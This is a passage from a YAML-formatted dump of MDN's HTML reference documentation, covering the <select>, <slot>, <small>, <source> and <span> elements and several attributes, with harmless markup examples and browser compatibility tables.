of a single line dropdown.\n\n[`name`](#name)  \nThis attribute is used to specify the name of the control.\n\n[`required`](../attributes/required)  \nA Boolean attribute indicating that an option with a non-empty string value must be selected.\n\n[`size`](../attributes/size)  \nIf the control is presented as a scrolling list box (e.g. when `multiple` is specified), this attribute represents the number of rows in the list that should be visible at one time. Browsers are not required to present a select element as a scrolled list box. The default value is `0`.\n\n**Note:** According to the HTML specification, the default value for size should be `1`; however, in practice, this has been found to break some websites, and no other browser currently does that, so Mozilla has opted to continue to return `0` for the time being with Firefox.\n\n## Usage notes\n\n### Selecting multiple options\n\nOn a desktop computer, there are a number of ways to select multiple options in a `<select>` element with a `multiple` attribute:\n\nMouse users can hold the Ctrl, Command, or Shift keys (depending on what makes sense for your operating system) and then click multiple options to select/deselect them.\n\n**Warning:** The mechanism for selecting multiple non-contiguous items via the keyboard described below currently only seems to work in Firefox.\n\nOn macOS, the Ctrl + Up and Ctrl + Down shortcuts conflict with the OS default shortcuts for *Mission Control* and *Application windows*, so you'll have to turn these off before it will work.\n\nKeyboard users can select multiple contiguous items by:\n\n- Focusing on the `<select>` element (e.g. using Tab ).\n- Selecting an item at the top or bottom of the range they want to select using the Up and Down cursor keys to go up and down the options.\n- Holding down the Shift key and then using the Up and Down cursor keys to increase or decrease the range of items selected.\n\nKeyboard users can select multiple non-contiguous items by:\n\n- Focusing on the `<select>` element (e.g. using Tab ).\n- Holding down the Ctrl key then using the Up and Down cursor keys to change the \"focused\" select option, i.e. the one that will be selected if you choose to do so. The \"focused\" select option is highlighted with a dotted outline, in the same way as a keyboard-focused link.\n- Pressing Space to select/deselect \"focused\" select options.\n\n## Styling with CSS\n\nThe `<select>` element is notoriously difficult to style productively with CSS. You can affect certain aspects like any element — for example, manipulating the [box model](https://developer.mozilla.org/en-US/docs/Learn/CSS/Building_blocks/The_box_model), the [displayed font](https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_fonts), etc., and you can use the [`appearance`](https://developer.mozilla.org/en-US/docs/Web/CSS/appearance) property to remove the default system `appearance`.\n\nHowever, these properties don't produce a consistent result across browsers, and it is hard to do things like line different types of form element up with one another in a column. The `<select>` element's internal structure is complex, and hard to control. If you want to get full control, you should consider using a library with good facilities for styling form widgets, or try rolling your own dropdown menu using non-semantic elements, JavaScript, and [WAI-ARIA](https://developer.mozilla.org/en-US/docs/Learn/Accessibility/WAI-ARIA_basics) to provide semantics.\n\nFor more useful information on styling `<select>`, see:\n\n- [Styling HTML forms](https://developer.mozilla.org/en-US/docs/Learn/Forms/Styling_web_forms)\n- [Advanced styling for HTML forms](https://developer.mozilla.org/en-US/docs/Learn/Forms/Advanced_form_styling)\n- The [`field-sizing`](https://developer.mozilla.org/en-US/docs/Web/CSS/field-sizing) property, which controls how `<select>` elements are sized in relation to their contained options.\n\n## Accessibility\n\nThe `<hr>` within a `<select>` should be considered purely decorative, as they are currently not exposed within the accessibility tree and therefore not exposed to assistive technologies.\n\n## Examples\n\n### Basic select\n\nThe following example creates a very simple dropdown menu, the second option of which is selected by default.\n\nhtml\n\n```\n<!-- The second value will be selected initially -->\n<select name=\"choice\">\n  <option value=\"first\">First Value</option>\n  <option value=\"second\" selected>Second Value</option>\n  <option value=\"third\">Third Value</option>\n</select>\n```\n\n#### Result\n\n### Select with grouping options\n\nThe following example creates a dropdown menu with grouping using [`<optgroup>`](optgroup) and [`<hr>`](hr) to make it easier for the user to understand the content in the dropdown.\n\nhtml\n\n```\n<label for=\"hr-select\">Your favorite food</label> <br />\n\n<select name=\"foods\" id=\"hr-select\">\n  <option value=\"\">Choose a food</option>\n  <hr />\n  <optgroup label=\"Fruit\">\n    <option value=\"apple\">Apples</option>\n    <option value=\"banana\">Bananas</option>\n    <option value=\"cherry\">Cherries</option>\n    <option value=\"damson\">Damsons</option>\n  </optgroup>\n  <hr />\n  <optgroup label=\"Vegetables\">\n    <option value=\"artichoke\">Artichokes</option>\n    <option value=\"broccoli\">Broccoli</option>\n    <option value=\"cabbage\">Cabbages</option>\n  </optgroup>\n  <hr />\n  <optgroup label=\"Meat\">\n    <option value=\"beef\">Beef</option>\n    <option value=\"chicken\">Chicken</option>\n    <option value=\"pork\">Pork</option>\n  </optgroup>\n  <hr />\n  <optgroup label=\"Fish\">\n    <option value=\"cod\">Cod</option>\n    <option value=\"haddock\">Haddock</option>\n    <option value=\"salmon\">Salmon</option>\n    <option value=\"turbot\">Turbot</option>\n  </optgroup>\n</select>\n```\n\n#### Result\n\n### Advanced select with multiple features\n\nThe follow example is more complex, showing off more features you can use on a `<select>` element:\n\nhtml\n\n```\n<label>\n  Please choose one or more pets:\n  <select name=\"pets\" multiple size=\"4\">\n    <optgroup label=\"4-legged pets\">\n      <option value=\"dog\">Dog</option>\n      <option value=\"cat\">Cat</option>\n      <option value=\"hamster\" disabled>Hamster</option>\n    </optgroup>\n    <optgroup label=\"Flying pets\">\n      <option value=\"parrot\">Parrot</option>\n      <option value=\"macaw\">Macaw</option>\n      <option value=\"albatross\">Albatross</option>\n    </optgroup>\n  </select>\n</label>\n```\n\n#### Result\n\nYou'll see that:\n\n- Multiple options are selectable because we've included the `multiple` attribute.\n- The `size` attribute causes only 4 lines to display at a time; you can scroll to view all the options.\n- We've included [`<optgroup>`](optgroup) elements to divide the options up into different groups. This is a purely visual grouping, its visualization generally consists of the group name being bolded, and the options being indented.\n- The \"Hamster\" option includes a `disabled` attribute and therefore can't be selected at all.\n\n## Technical summary\n\n|                                             |                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |\n|---------------------------------------------|--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | [Flow content](../content_categories#flow_content), [phrasing content](../content_categories#phrasing_content), [interactive content](../content_categories#interactive_content), [listed](../content_categories#form_listed), [labelable](../content_categories#form_labelable), [resettable](../content_categories#form_resettable), and [submittable](../content_categories#form_submittable) [form-associated](../content_categories#form-associated_) element |\n| Permitted content                           | Zero or more [`<option>`](option), [`<optgroup>`](optgroup) or [`<hr>`](hr) elements.                                                                                                                                                                                                                                                                                                                                                                              |\n| Tag omission                                | None, both the starting and ending tag are mandatory.                                                                                                                                                                                                                                                                                                                                                                                                              |\n| Permitted parents                           | Any element that accepts [phrasing content](../content_categories#phrasing_content).                                                                                                                                                                                                                                                                                                                                                                               |\n| Implicit ARIA role                          | [`combobox`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/combobox_role) with **no** `multiple` attribute and **no** `size` attribute greater than 1, otherwise [`listbox`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/listbox_role)                                                                                                                                                                           |\n| Permitted ARIA roles                        | [`menu`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/menu_role) with **no** `multiple` attribute and **no** `size` attribute greater than 1, otherwise no `role` permitted                                                                                                                                                                                                                                                               |\n| DOM interface                               | [`HTMLSelectElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLSelectElement)                                                                                                                                                                                                                                                                                                                                                                          |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n[TABLE]\n\n## See also\n\n- Events fired by `<select>`: [`change`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/change_event), [`input`](https://developer.mozilla.org/en-US/docs/Web/API/Element/input_event)\n- The [`<option>`](option) element\n- The [`<optgroup>`](optgroup) element\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/select](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/select)"
- name: selected (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`selected`](element/option#selected)

    [`<option>`](element/option)

    Defines a value which will be selected on page load.
- name: shape (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`shape`](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/shape)

    [`<a>`](element/a), [`<area>`](element/area)
- name: size (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`size`](attributes/size)

    [`<input>`](element/input), [`<select>`](element/select)

    Defines the width of the element (in pixels). If the element's `type` attribute is `text` or `password` then it's the number of characters.
- name: sizes (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`sizes`](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/sizes)

    [`<link>`](element/link), [`<img>`](element/img), [`<source>`](element/source)
- name: slot
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<slot\\>: The Web Component Slot element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since January 2020.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Fslot&level=high)\n\nThe `<slot>` [HTML](../index) element—part of the [Web Components](https://developer.mozilla.org/en-US/docs/Web/API/Web_components) technology suite—is a placeholder inside a web component that you can fill with your own markup, which lets you create separate DOM trees and present them together.\n\n## Attributes\n\nThis element includes the [global attributes](../global_attributes).\n\n[`name`](#name)  \nThe slot's name.\n\nA ***named slot*** is a `<slot>` element with a `name` attribute.\n\n## Examples\n\nhtml\n\n```\n<template id=\"element-details-template\">\n  <style>\n    details {\n      font-family: \"Open Sans Light\", Helvetica, Arial, sans-serif;\n    }\n    .name {\n      font-weight: bold;\n      color: #217ac0;\n      font-size: 120%;\n    }\n    h4 {\n      margin: 10px 0 -8px 0;\n      background: #217ac0;\n      color: white;\n      padding: 2px 6px;\n      border: 1px solid #cee9f9;\n      border-radius: 4px;\n    }\n    .attributes {\n      margin-left: 22px;\n      font-size: 90%;\n    }\n    .attributes p {\n      margin-left: 16px;\n      font-style: italic;\n    }\n  </style>\n  <details>\n    <summary>\n      <code class=\"name\">\n        &lt;<slot name=\"element-name\">NEED NAME</slot>&gt;\n      </code>\n      <span class=\"desc\"><slot name=\"description\">NEED DESCRIPTION</slot></span>\n    </summary>\n    <div class=\"attributes\">\n      <h4>Attributes</h4>\n      <slot name=\"attributes\"><p>None</p></slot>\n    </div>\n  </details>\n  <hr />\n</template>\n```\n\n**Note:** You can see this complete example in action at [element-details](https://github.com/mdn/web-components-examples/tree/main/element-details) (see it [running live](https://mdn.github.io/web-components-examples/element-details/)). In addition, you can find an explanation at [Using templates and slots](https://developer.mozilla.org/en-US/docs/Web/API/Web_components/Using_templates_and_slots).\n\n## Technical summary\n\n|                                             |                                                                                                                |\n|---------------------------------------------|----------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | [Flow content](../content_categories#flow_content), [phrasing content](../content_categories#phrasing_content) |\n| Permitted content                           | [Transparent](../content_categories#transparent_content_model)                                                 |\n| Events                                      | [`slotchange`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLSlotElement/slotchange_event)              |\n| Tag omission                                | None, both the starting and ending tag are mandatory.                                                          |\n| Permitted parents                           | Any element that accepts [phrasing content](../content_categories#phrasing_content)                            |\n| Implicit ARIA role                          | [No corresponding role](https://www.w3.org/TR/html-aria/#dfn-no-corresponding-role)                            |\n| Permitted ARIA roles                        | No `role` permitted                                                                                            |\n| DOM interface                               | [`HTMLSlotElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLSlotElement)                          |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|        | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|--------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|        | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `slot` | 53      | 79   | 63      | 40    | 10     | 53             | 63                  | 41            | 10            | 6.0              | 53              |     |\n| `name` | 53      | 79   | 63      | 40    | 10     | 53             | 63                  | 41            | 10            | 6.0              | 53              |     |\n\n## See also\n\n- HTML [`<template>`](template) element\n- HTML [`slot`](../global_attributes/slot) attribute\n- CSS [`::slotted`](https://developer.mozilla.org/en-US/docs/Web/CSS/::slotted) pseudo-element\n- [CSS scoping](https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_scoping) module\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/slot](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/slot)"
- name: slot (attribute)
  summary: This feature is well established and works across many devices and browser versions
  description: "# slot\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since January 2020.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FGlobal_attributes%2Fslot&level=high)\n\nThe `slot` [global attribute](../global_attributes) assigns a slot in a [shadow DOM](https://developer.mozilla.org/en-US/docs/Web/API/Web_components/Using_shadow_DOM) shadow tree to an element: An element with a `slot` attribute is assigned to the slot created by the [`<slot>`](../element/slot) element whose [`name`](../element/slot#name) attribute's value matches that `slot` attribute's value.\n\nFor examples, see our [Using templates and slots](https://developer.mozilla.org/en-US/docs/Web/API/Web_components/Using_templates_and_slots) guide.\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|        | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|--------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|        | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `slot` | 53      | ≤79  | 63      | 40    | 10     | 53             | 63                  | 41            | 10            | 6.0              | 53              |     |\n\n## See also\n\n- HTML [global attributes](../global_attributes)\n- HTML [`<slot>`](../element/slot) element\n- HTML [`<template>`](../element/template) element\n- CSS [`::slotted`](https://developer.mozilla.org/en-US/docs/Web/CSS/::slotted) pseudo-element\n- [CSS scoping](https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_scoping) module\n- [Web components](https://developer.mozilla.org/en-US/docs/Web/API/Web_components)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/slot](https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/slot)"
- name: small
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<small\\>: the side comment element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Fsmall&level=high)\n\nThe `<small>` [HTML](../index) element represents side-comments and small print, like copyright and legal text, independent of its styled presentation. By default, it renders text within it one font-size smaller, such as from `small` to `x-small`.\n\n## Try it\n\n#### HTML Demo: \\<small\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <p>MDN Web Docs is a learning platform for Web technologies and the software that powers the Web.</p>\n\n    <hr />\n\n    <p><small>The content is licensed under a Creative Commons Attribution-ShareAlike 2.5 Generic License.</small></p>\n\n    small {\n      font-size: 0.7em;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Attributes\n\nThis element only includes the [global attributes](../global_attributes).\n\n## Examples\n\n### Basic usage\n\nhtml\n\n```\n<p>\n  This is the first sentence.\n  <small>This whole sentence is in small letters.</small>\n</p>\n```\n\n#### Result\n\n### CSS alternative\n\nhtml\n\n```\n<p>\n  This is the first sentence.\n  <span style=\"font-size:0.8em\">This whole sentence is in small letters.</span>\n</p>\n```\n\n#### Result\n\n## Notes\n\nAlthough the `<small>` element, like the [`<b>`](b) and [`<i>`](i) elements, may be perceived to violate the principle of separation between structure and presentation, all three are valid in HTML. Authors are encouraged to use their best judgement when determining whether to use `<small>` or CSS.\n\n## Technical summary\n\n|                                             |                                                                                                                                                                      |\n|---------------------------------------------|----------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | [Flow content](../content_categories#flow_content), [phrasing content](../content_categories#phrasing_content).                                                      |\n| Permitted content                           | [Phrasing content](../content_categories#phrasing_content)                                                                                                           |\n| Tag omission                                | None; must have both a start tag and an end tag.                                                                                                                     |\n| Permitted parents                           | Any element that accepts [phrasing content](../content_categories#phrasing_content), or any element that accepts [flow content](../content_categories#flow_content). |\n| Implicit ARIA role                          | [`generic`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/generic_role)                                                                      |\n| Permitted ARIA roles                        | Any                                                                                                                                                                  |\n| DOM interface                               | [`HTMLElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement)                                                                                        |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|         | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|---------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|         | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `small` | 1       | 12   | 1       | 15    | ≤4     | 18             | 4                   | 14            | ≤3.2          | 1.0              | 4.4             |     |\n\n## See also\n\n- [`<b>`](b)\n- [`<sub>`](sub) and [`<sup>`](sup)\n- [`<font>`](font)\n- [`<style>`](style)\n- HTML 4.01 Specification: [Font Styles](https://www.w3.org/TR/html4/present/graphics.html#h-15.2)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/small](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/small)"
- name: source
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<source\\>: The Media or Image Source element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Fsource&level=high)\n\nThe `<source>` [HTML](../index) element specifies one or more media resources for the [`<picture>`](picture), [`<audio>`](audio), and [`<video>`](video) elements. It is a [void element](https://developer.mozilla.org/en-US/docs/Glossary/Void_element), which means that it has no content and does not require a closing tag. This element is commonly used to offer the same media content in multiple file formats in order to provide compatibility with a broad range of browsers given their differing support for [image file formats](https://developer.mozilla.org/en-US/docs/Web/Media/Formats/Image_types) and [media file formats](https://developer.mozilla.org/en-US/docs/Web/Media/Formats).\n\n## Try it\n\n#### HTML Demo: \\<source\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <video controls width=\"250\" height=\"200\" muted>\n      <source src=\"/media/cc0-videos/flower.webm\" type=\"video/webm\" />\n      <source src=\"/media/cc0-videos/flower.mp4\" type=\"video/mp4\" />\n      Download the\n      <a href=\"/media/cc0-videos/flower.webm\">WEBM</a>\n      or\n      <a href=\"/media/cc0-videos/flower.mp4\">MP4</a>\n      video.\n    </video>\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Attributes\n\nThis element supports all [global attributes](../global_attributes). In addition, the following attributes can be used with it:\n\n[`type`](#type)  \nSpecifies the [MIME media type of the image](https://developer.mozilla.org/en-US/docs/Web/Media/Formats/Image_types) or [other media type](https://developer.mozilla.org/en-US/docs/Web/Media/Formats/Containers), optionally including a [`codecs` parameter](https://developer.mozilla.org/en-US/docs/Web/Media/Formats/codecs_parameter).\n\n[`src`](#src)  \nSpecifies the URL of the media resource. Required if the parent of `<source>` is [`<audio>`](audio) or [`<video>`](video). Not allowed if the parent is [`<picture>`](picture).\n\n[`srcset`](#srcset)  \nSpecifies a comma-separated list of one or more image URLs and their descriptors. Required if the parent of `<source>` is [`<picture>`](picture). Not allowed if the parent is [`<audio>`](audio) or [`<video>`](video).\n\nThe list consists of strings separated by commas, indicating a set of possible images for the browser to use. Each string is composed of:\n\n- A URL specifying an image location.\n- An optional width descriptor—a positive integer directly followed by `\"w\"`, such as `300w`.\n- An optional pixel density descriptor—a positive floating number directly followed by `\"x\"`, such as `2x`.\n\nEach string in the list must have either a width descriptor or a pixel density descriptor to be valid. These two descriptors should not be used together; only one should be used consistently throughout the list. The value of each descriptor in the list must be unique. The browser chooses the most adequate image to display at a given point of time based on these descriptors. If the descriptors are not specified, the default value used is `1x`. If the `sizes` attribute is also present, then each string must include a width descriptor. If the browser does not support `srcset`, then `src` will be used for the default image source.\n\n[`sizes`](#sizes)  \nSpecifies a list of source sizes that describe the final rendered width of the image. Allowed if the parent of `<source>` is [`<picture>`](picture). Not allowed if the parent is [`<audio>`](audio) or [`<video>`](video).\n\nThe list consists of source sizes separated by commas. Each source size is media condition-length pair. Before laying the page out, the browser uses this information to determine which image defined in [`srcset`](#srcset) to display. Note that `sizes` will take effect only if width descriptors are provided with `srcset`, not pixel density descriptors (i.e., `200w` should be used instead of `2x`).\n\n[`media`](#media)  \nSpecifies the [media query](https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_media_queries) for the resource's intended media.\n\n[`height`](#height)  \nSpecifies the intrinsic height of the image in pixels. Allowed if the parent of `<source>` is a [`<picture>`](picture). Not allowed if the parent is [`<audio>`](audio) or [`<video>`](video).\n\nThe height value must be an integer without any units.\n\n[`width`](#width)  \nSpecifies the intrinsic width of the image in pixels. Allowed if the parent of `<source>` is a [`<picture>`](picture). Not allowed if the parent is [`<audio>`](audio) or [`<video>`](video).\n\nThe width value must be an integer without any units.\n\n## Usage notes\n\nThe `<source>` element is a **[void element](https://developer.mozilla.org/en-US/docs/Glossary/Void_element)**, which means that it not only has no content but also has no closing tag. That is, you *never* use \"`</source>`\" in your HTML.\n\nThe browser goes through a list of `<source>` elements to find a format it supports. It uses the first one it can display. For each `<source>` element:\n\n- If the `type` attribute isn't specified, the browser retrieves the media's type from the server and determines if it can be displayed. If the media can't be rendered, the browser checks the next `<source>` in the list.\n- If the `type` attribute is specified, the browser immediately compares it with the media types it can display. If the type is not supported, the browser skips querying the server and directly checks the next `<source>` element.\n\nIf none of the `<source>` elements provide a usable source:\n\n- In the case of a `<picture>` element, the browser will fall back to using the image specified in the `<picture>` element's [`<img>`](img) child.\n- In the case of an `<audio>` or `<video>` element, the browser will fall back to displaying the content included between the element's opening and closing tags.\n\nFor information about image formats supported by web browsers and guidance on selecting appropriate formats to use, see our [Image file type and format guide](https://developer.mozilla.org/en-US/docs/Web/Media/Formats/Image_types). For details on the video and audio media types you can use, see the [Media type and format guide](https://developer.mozilla.org/en-US/docs/Web/Media/Formats).\n\n## Examples\n\n### Using the `type` attribute with `<video>`\n\nThis example demonstrates how to offer a video in different formats: WebM for browsers that support it, Ogg for those that support Ogg, and QuickTime for browsers that support QuickTime. If the `<audio>` or `<video>` element is not supported by the browser, a notice is displayed instead. If the browser supports the element but does not support any of the specified formats, an `error` event is raised and the default media controls (if enabled) will indicate an error. For more details on which media file formats to use and their browser support, refer to our [Media type and format guide](https://developer.mozilla.org/en-US/docs/Web/Media/Formats).\n\nhtml\n\n```\n<video controls>\n  <source src=\"foo.webm\" type=\"video/webm\" />\n  <source src=\"foo.ogg\" type=\"video/ogg\" />\n  <source src=\"foo.mov\" type=\"video/quicktime\" />\n  I'm sorry; your browser doesn't support HTML video.\n</video>\n```\n\n### Using the `media` attribute with `<video>`\n\nThis example demonstrates how to offer an alternate source file for viewports above a certain width. When a user's browsing environment meets the specified `media` condition, the associated `<source>` element is chosen. The contents of its `src` attribute are then requested and rendered. If the `media` condition does not match, the browser will move on to the next `<source>` in the list. The second `<source>` option in the code below has no `media` condition, so it will be selected for all other browsing contexts.\n\nhtml\n\n```\n<video controls>\n  <source src=\"foo-large.webm\" media=\"(min-width: 800px)\" />\n  <source src=\"foo.webm\" />\n  I'm sorry; your browser doesn't support HTML video.\n</video>\n```\n\nFor more examples, the [Video and audio content](https://developer.mozilla.org/en-US/docs/Learn/HTML/Multimedia_and_embedding/Video_and_audio_content) article in the Learn area is a great resource.\n\n### Using the `media` attribute with `<picture>`\n\nIn this example, two `<source>` elements are included within [`<picture>`](picture), providing versions of an image to use when the available space exceeds certain widths. If the available width is less than the smallest of these widths, the browser will fall back to the image specified in the [`<img>`](img) element.\n\nhtml\n\n```\n<picture>\n  <source srcset=\"mdn-logo-wide.png\" media=\"(min-width: 800px)\" />\n  <source srcset=\"mdn-logo-medium.png\" media=\"(min-width: 600px)\" />\n  <img src=\"mdn-logo-narrow.png\" alt=\"MDN Web Docs\" />\n</picture>\n```\n\nWith the `<picture>` element, you must always include an `<img>` with a fallback image. Also, make sure to add an `alt` attribute for accessibility, unless the image is purely decorative and irrelevant to the content.\n\n### Using `height` and `width` attributes with `<picture>`\n\nIn this example, three `<source>` elements with `height` and `width` attributes are included in a [`<picture>`](picture) element. A [media query](https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_media_queries/Using_media_queries) allows the browser to select an image to display with the `height` and `width` attributes based on the [viewport](https://developer.mozilla.org/en-US/docs/Glossary/Viewport) size.\n\nhtml\n\n```\n<picture>\n  <source\n    srcset=\"landscape.png\"\n    media=\"(min-width: 1000px)\"\n    width=\"1000\"\n    height=\"400\" />\n  <source\n    srcset=\"square.png\"\n    media=\"(min-width: 800px)\"\n    width=\"800\"\n    height=\"800\" />\n  <source\n    srcset=\"portrait.png\"\n    media=\"(min-width: 600px)\"\n    width=\"600\"\n    height=\"800\" />\n  <img\n    src=\"fallback.png\"\n    alt=\"Image used when the browser does not support the sources\"\n    width=\"500\"\n    height=\"400\" />\n</picture>\n```\n\n## Technical summary\n\n|                                             |                                                                                                                                                                                                                                                                        |\n|---------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | None.                                                                                                                                                                                                                                                                  |\n| Permitted content                           | None; it is a [void element](https://developer.mozilla.org/en-US/docs/Glossary/Void_element).                                                                                                                                                                          |\n| Tag omission                                | Must have a start tag and must not have an end tag.                                                                                                                                                                                                                    |\n| Permitted parents                           | A media element—[`<audio>`](audio) or [`<video>`](video)—and it must be placed before any [flow content](../content_categories#flow_content) or [`<track>`](track) element. A [`<picture>`](picture) element, and it must be placed before the [`<img>`](img) element. |\n| Implicit ARIA role                          | [No corresponding role](https://www.w3.org/TR/html-aria/#dfn-no-corresponding-role)                                                                                                                                                                                    |\n| Permitted ARIA roles                        | No `role` permitted                                                                                                                                                                                                                                                    |\n| DOM interface                               | [`HTMLSourceElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLSourceElement)                                                                                                                                                                              |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n[TABLE]\n\n## See also\n\n- [`<audio>`](audio) element\n- [`<picture>`](picture) element\n- [`<video>`](video) element\n- [Image file type and format guide](https://developer.mozilla.org/en-US/docs/Web/Media/Formats/Image_types)\n- [Media type and format guide](https://developer.mozilla.org/en-US/docs/Web/Media/Formats)\n- [Web performance](https://developer.mozilla.org/en-US/docs/Learn/Performance)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/source](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/source)"
- name: span
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<span\\>: The Content Span element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Fspan&level=high)\n\nThe `<span>` [HTML](../index) element is a generic inline container for phrasing content, which does not inherently represent anything. It can be used to group elements for styling purposes (using the [`class`](../global_attributes#class) or [`id`](../global_attributes#id) attributes), or because they share attribute values, such as [`lang`](../global_attributes#lang). It should be used only when no other semantic element is appropriate. `<span>` is very much like a [`<div>`](div) element, but [`<div>`](div) is a [block-level element](https://developer.mozilla.org/en-US/docs/Glossary/Block-level_content) whereas a `<span>` is an [inline-level element](https://developer.mozilla.org/en-US/docs/Glossary/Inline-level_content).\n\n## Try it\n\n#### HTML Demo: \\<span\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <p>\n      Add the <span class=\"ingredient\">basil</span>, <span class=\"ingredient\">pine nuts</span> and\n      <span class=\"ingredient\">garlic</span> to a blender and blend into a paste.\n    </p>\n\n    <p>Gradually add the <span class=\"ingredient\">olive oil</span> while running the blender slowly.</p>\n\n    span.ingredient {\n      color: #f00;\n    